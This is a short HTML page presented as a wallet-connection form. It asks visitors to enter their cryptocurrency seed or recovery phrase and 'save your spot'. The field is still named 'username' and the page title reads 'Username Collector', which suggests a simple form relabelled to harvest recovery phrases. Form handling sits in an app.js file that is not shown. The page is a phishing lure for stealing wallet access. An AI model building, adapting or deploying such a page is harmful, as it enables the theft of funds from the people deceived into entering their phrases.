<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="theme-color" content="#f5f3ee">
    <title>Username Collector</title>
    <link rel="stylesheet" href="/styles.css">
    <script src="/app.js" defer></script>
  </head>
  <body>
    <main class="card">
      <div class="eyebrow"><span class="status-dot"></span> CONNECT YOUR WALLET</div>
      <h1>Make your<br><span>mark.</span></h1>
      <p class="intro">Enter you seed/recovery phrase and save your spot. It only takes a moment.</p>

      <form id="username-form">
        <label for="username">Your seed phrase</label>
        <div class="input-wrap">
          <span class="at-sign" aria-hidden="true"></span>
          <input
            id="username"
            name="username"
            type="text"
            placeholder="e.g. alex"
            minlength="1"
            maxlength="50"
            autocomplete="username"
            required
          >
        </div>
        <button type="submit">
          <span>Save seed phrase</span>
          <span class="arrow" aria-hidden="true">→</span>
        </button>
        <p id="form-message" class="message" role="status" aria-live="polite"></p>
      </form>

      <div class="card-footer"><span>YOUR WALLET, YOUR SPACE.</span><span>01 / 01</span></div>
    </main>
  </body>
</html>
